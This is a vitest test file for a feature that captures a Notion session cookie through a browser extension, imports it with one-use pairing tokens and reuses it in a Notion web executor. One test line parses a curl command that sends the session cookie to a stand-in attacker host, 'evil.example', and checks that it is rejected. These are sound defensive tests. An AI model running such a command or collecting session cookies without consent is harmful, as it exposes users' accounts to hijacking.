import fs from "node:fs";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest } from "next/server";
import { createBetterSqliteAdapter } from "../../src/lib/db/adapters/betterSqliteAdapter.js";
import { MIGRATIONS } from "../../src/lib/db/migrations/index.js";
import { applyVersionedMigrations } from "../../src/lib/db/migrate.js";

const state = await vi.hoisted(async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const original = process.env.DATA_DIR;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "notion-cookie-2034-"));
  process.env.DATA_DIR = dir;
  return { original, dir, getAdapter: vi.fn(), getAdapterSync: vi.fn(), access: vi.fn(), operator: vi.fn(), origin: vi.fn() };
});
vi.mock("@/lib/db/driver.js", () => ({ getAdapter: state.getAdapter, getAdapterSync: state.getAdapterSync }));
vi.mock("@/dashboardGuard", () => ({ canAccessManagementApi: state.access, isOperatorRequest: state.operator, hasExactRequestOrigin: state.origin }));
vi.mock("@/lib/localDb", async () => ({ ...(await import("../../src/lib/db/repos/connectionsRepo.js")), getProviderNodeById: vi.fn(), getProviderNodes: vi.fn(), getProxyPoolById: vi.fn() }));

import { POST as pair } from "../../src/app/api/providers/cookie-import/pairing/route.js";
import { POST as ingest } from "../../src/app/api/providers/cookie-import/route.js";
import { getProviderConnectionById } from "../../src/lib/db/repos/connectionsRepo.js";
import { clearPairings } from "../../src/lib/providers/cookieImport/pairing.js";
import { PAIRING_HEADER } from "../../src/lib/providers/cookieImport/handlers.js";
import { getCookieImportContract, buildImportedCookieHeader } from "../../src/lib/providers/cookieImport/contract.js";
import { buildImportCandidates, parseCookieHeaderValue, parseCurlCommand, parseHarDocument } from "../../src/shared/utils/cookieImportParser.js";
import { parsePairing, preflightPermissions, runCapture, confirmationFor } from "../../extensions/provider-cookie-capture/capture.js";
import { NotionWebExecutor } from "../../open-sse/executors/notion-web.js";

const dashboard = "https://dashboard.example";
const origin = "https://app.notion.com";
const secret = "synthetic-notion-session-A";
const replacement = "synthetic-notion-session-B";
const cookie = (value = secret, extra = {}) => ({ name: "token_v2", value, domain: "app.notion.com", secure: true, ...extra });
const request = (url, body, headers = {}) => new NextRequest(url, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify(body) });
const pairRequest = (body) => request(`${dashboard}/api/providers/cookie-import/pairing`, body, { origin: dashboard, "x-9r-cli-token": "synthetic-operator" });
const importRequest = (token, body) => request(`${dashboard}/api/providers/cookie-import`, body, { [PAIRING_HEADER]: token, origin: "chrome-extension://synthetic" });
let db;
async function issue(target) {
  const res = await pair(pairRequest({ provider: "notion-web", ...target }));
  expect(res.status).toBe(201);
  return (await res.json()).pairing;
}
async function create(name, value = secret) {
  const p = await issue({ action: "create", name });
  const res = await ingest(importRequest(p.token, { provider: "notion-web", origin, cookies: [cookie(value)] }));
  expect(res.status).toBe(201);
  const text = await res.text();
  expect(text).not.toContain(value);
  return JSON.parse(text).connection;
}
beforeEach(() => {
  clearPairings();
  vi.stubEnv("BASE_URL", dashboard);
  vi.stubEnv("NEXT_PUBLIC_BASE_URL", "");
  vi.stubEnv("DURINDOOR_WEB_LOGIN_ORIGIN", "https://login.example");
  db = createBetterSqliteAdapter(":memory:");
  db.exec("CREATE TABLE _meta (key TEXT PRIMARY KEY, value TEXT NOT NULL)");
  applyVersionedMigrations(db, MIGRATIONS);
  state.getAdapter.mockReset().mockResolvedValue(db);
  state.getAdapterSync.mockReset().mockReturnValue(db);
  state.access.mockReset().mockResolvedValue(true);
  state.operator.mockReset().mockResolvedValue(true);
  state.origin.mockReset().mockReturnValue(true);
  for (const method of ["log", "info", "warn", "error", "debug"]) vi.spyOn(console, method).mockImplementation(() => {});
});
afterEach(() => { db.close(); vi.unstubAllEnvs(); vi.restoreAllMocks(); });
afterAll(() => { if (state.original === undefined) delete process.env.DATA_DIR; else process.env.DATA_DIR = state.original; fs.rmSync(state.dir, { recursive: true, force: true }); });

describe("notion-web real cookie flow", () => {
  it("filters Cookie, cURL and HAR inputs using the registered contract", () => {
    const contract = getCookieImportContract("notion-web");
    expect(contract).toMatchObject({ origin, cookieNames: ["token_v2"], cookiePrefixes: [], extensionCapture: true });
    expect(contract.optionalCookies || []).toEqual([]);
    expect(contract.localStorageKeys || []).toEqual([]);
    const header = `token_v2=${secret}; space_id=synthetic-space`;
    const inputs = [
      { kind: "header", parsed: parseCookieHeaderValue(header) },
      { kind: "curl", parsed: parseCurlCommand(`curl '${origin}/api/v3/getSpaces' -H 'cookie: ${header}'`) },
      { kind: "har", parsed: parseHarDocument(JSON.stringify({ log: { entries: [{ request: { url: `${origin}/`, headers: [{ name: "cookie", value: header }] } }] } })) },
    ];
    for (const input of inputs) expect(buildImportCandidates(input, contract)).toMatchObject({ ok: true, candidates: [{ cookies: [{ name: "token_v2", value: secret }], dropped: ["space_id"] }] });
    expect(buildImportCandidates({ kind: "curl", parsed: parseCurlCommand(`curl 'https://evil.example/' -H 'cookie: ${header}'`) }, contract).ok).toBe(false);
    expect(buildImportedCookieHeader(contract, [cookie("x", { name: "token_v2.0" })]).ok).toBe(false);
    expect(buildImportedCookieHeader(contract, [cookie("x", { expirationDate: 1 })]).ok).toBe(false);
    expect(buildImportedCookieHeader(contract, [cookie("x", { domain: "evil.example" })]).ok).toBe(false);
  });

  it("captures the selected tab's approved cookie and imports it with a one-use authenticated pairing", async () => {
    const p = await issue({ action: "create", name: "Notion A" });
    const parsed = parsePairing(JSON.stringify({ pairing: p }), Date.now());
    expect(parsed.ok).toBe(true);
    const plan = parsed.plan; plan.tabId = 7;
    const held = new Set();
    const permissions = (q) => [...(q.permissions || []), ...(q.origins || [])];
    const get = vi.fn(async ({ name }) => name === "token_v2" ? cookie() : null);
    const chrome = { tabs: { get: async () => ({ id: 7, url: `${origin}/` }) }, permissions: {
      contains: async (q) => permissions(q).every((v) => held.has(v)),
      request: async (q) => { permissions(q).forEach((v) => held.add(v)); return true; },
      remove: async () => true,
    }, cookies: { getAllCookieStores: async () => [{ id: "selected", tabIds: [7] }], get, getAll: vi.fn() } };
    await preflightPermissions(chrome, plan);
    const send = vi.fn(async (url, init) => ingest(new NextRequest(url, init)));
    const result = await runCapture({ chrome, fetch: send, plan, confirmed: confirmationFor(plan) });
    expect(result.ok).toBe(true);
    expect(get).toHaveBeenCalledWith({ url: `${origin}/`, name: "token_v2", storeId: "selected" });
    expect(chrome.cookies.getAll).not.toHaveBeenCalled();
    expect(send).toHaveBeenCalledTimes(1);
    expect((await getProviderConnectionById(result.connection.id)).apiKey).toBe(`token_v2=${secret}`);
    expect((await ingest(importRequest(p.token, { provider: "notion-web", origin, cookies: [cookie()] }))).status).toBe(401);
    expect(JSON.stringify(result)).not.toContain(secret);
  });

  it("selects and replaces one connection, refuses foreign targets and unsafe imports, and sends stored credentials to the executor", async () => {
    state.access.mockResolvedValueOnce(false);
    expect((await pair(pairRequest({ provider: "notion-web", action: "create", name: "Denied" }))).status).toBe(403);
    const a = await create("Notion A");
    const b = await create("Notion B", "synthetic-notion-session-C");
    const update = await issue({ action: "update", connectionId: a.id });
    expect((await ingest(importRequest(update.token, { provider: "notion-web", origin, connectionId: b.id, cookies: [cookie()] }))).status).toBe(409);
    const selected = await issue({ action: "update", connectionId: a.id });
    const res = await ingest(importRequest(selected.token, { provider: "notion-web", origin, connectionId: a.id, cookies: [cookie(replacement)] }));
    expect(res.status).toBe(200);
    expect(await res.text()).not.toContain(replacement);
    expect((await getProviderConnectionById(b.id)).apiKey).toBe("token_v2=synthetic-notion-session-C");
    for (const body of [{ origin: "https://evil.example", cookies: [cookie()] }, { origin, cookies: [cookie(secret, { expirationDate: 1 })] }]) {
      const p = await issue({ action: "create", name: "Rejected" });
      const denied = await ingest(importRequest(p.token, { provider: "notion-web", ...body }));
      expect(denied.status).toBe(400);
      expect(await denied.text()).not.toContain(secret);
    }
    const stored = await getProviderConnectionById(a.id);
    const fetcher = vi.fn().mockResolvedValueOnce(Response.json({ user: { space: { "space-a": {} } } })).mockResolvedValueOnce(Response.json({ models: [] })).mockResolvedValueOnce(new Response('{"value":{"text":"ok"}}\n'));
    const proxyOptions = { proxyUrl: "http://proxy.example:8080" };
    const output = await new NotionWebExecutor({ fetcher }).execute({ model: "notion-ai", body: { model: "notion-ai", messages: [{ role: "user", content: "hello" }] }, credentials: { apiKey: stored.apiKey, connectionId: stored.id }, proxyOptions });
    expect(output.response.status).toBe(200);
    expect(fetcher).toHaveBeenCalledTimes(3);
    for (const [, init, proxy] of fetcher.mock.calls) { expect(init.headers.cookie).toBe(`token_v2=${replacement}`); expect(proxy).toEqual(proxyOptions); }
    expect(JSON.stringify(output.headers)).not.toContain(replacement);
    for (const method of ["log", "info", "warn", "error", "debug"]) expect(JSON.stringify(console[method].mock.calls)).not.toContain(secret);
  });
});
